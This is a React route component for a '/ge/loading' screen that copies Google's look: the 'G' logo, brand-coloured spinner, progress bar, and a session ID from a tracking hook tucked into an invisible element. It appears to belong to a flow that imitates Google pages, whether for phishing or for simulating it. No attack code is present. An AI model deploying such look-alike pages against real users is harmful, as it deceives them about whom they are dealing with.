import { createFileRoute } from "@tanstack/react-router";
import {
  GE_FONT_FAMILY,
  GE_PAGE_BG,
  GeFontStyle,
  GoogleGLogo,
  useGeTracking,
} from "@/components/ge/GeShared";

export const Route = createFileRoute("/ge/loading")({
  head: () => ({ meta: [{ title: "Loading…" }] }),
  component: GeLoadingPage,
});

const GE_LOADING_CSS = `
.ge-loading-page {
  --gm3-page: ${GE_PAGE_BG};
  --blue: #4285F4;
  --red: #EA4335;
  --yellow: #FBBC05;
  --green: #34A853;
  box-sizing: border-box;
  margin: 0;
  min-height: 100vh;
  background: var(--gm3-page);
  font-family: ${GE_FONT_FAMILY};
  -webkit-font-smoothing: antialiased;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  gap: 28px;
}
.ge-loading-page .logo { width: 48px; height: 48px; display: block; }
.ge-loading-page .spinner { width: 48px; height: 48px; position: relative; }
.ge-loading-page .spinner svg {
  width: 48px;
  height: 48px;
  animation: ge-rotate 1.4s linear infinite;
  transform-origin: center;
}
.ge-loading-page .spinner circle {
  fill: none;
  stroke-width: 4;
  stroke-linecap: round;
  stroke-dasharray: 80, 200;
  stroke-dashoffset: 0;
  animation: ge-dash 1.4s ease-in-out infinite, ge-colors 5.6s ease-in-out infinite;
}
@keyframes ge-rotate { 100% { transform: rotate(360deg); } }
@keyframes ge-dash {
  0% { stroke-dasharray: 1, 200; stroke-dashoffset: 0; }
  50% { stroke-dasharray: 90, 200; stroke-dashoffset: -35; }
  100% { stroke-dasharray: 90, 200; stroke-dashoffset: -124; }
}
@keyframes ge-colors {
  0%, 100% { stroke: var(--blue); }
  25% { stroke: var(--red); }
  50% { stroke: var(--yellow); }
  75% { stroke: var(--green); }
}
.ge-loading-page .bar-wrap {
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  height: 4px;
  background: transparent;
  overflow: hidden;
}
.ge-loading-page .bar {
  height: 100%;
  width: 40%;
  background: var(--blue);
  animation: ge-bar-slide 1.2s cubic-bezier(.4,0,.2,1) infinite;
}
@keyframes ge-bar-slide {
  0% { transform: translateX(-100%); }
  100% { transform: translateX(350%); }
}
.ge-loading-page .sr-only {
  position: absolute;
  width: 1px;
  height: 1px;
  padding: 0;
  margin: -1px;
  overflow: hidden;
  clip: rect(0,0,0,0);
  border: 0;
}
html, body { background: ${GE_PAGE_BG} !important; }
`;

function GeLoadingPage() {
  const { sessionId } = useGeTracking();
  return (
    <div className="ge-loading-page">
      <GeFontStyle />
      <style>{GE_LOADING_CSS}</style>
      <div className="bar-wrap" aria-hidden="true">
        <div className="bar" />
      </div>
      <GoogleGLogo className="logo" width={48} height={48} />
      <div className="spinner" role="progressbar" aria-label="Loading">
        <svg viewBox="0 0 50 50">
          <circle cx="25" cy="25" r="20" />
        </svg>
        <span className="sr-only">Loading</span>
      </div>
      <div className="fixed bottom-2 right-2 text-[10px] opacity-0 pointer-events-none">
        {sessionId}
      </div>
    </div>
  );
}
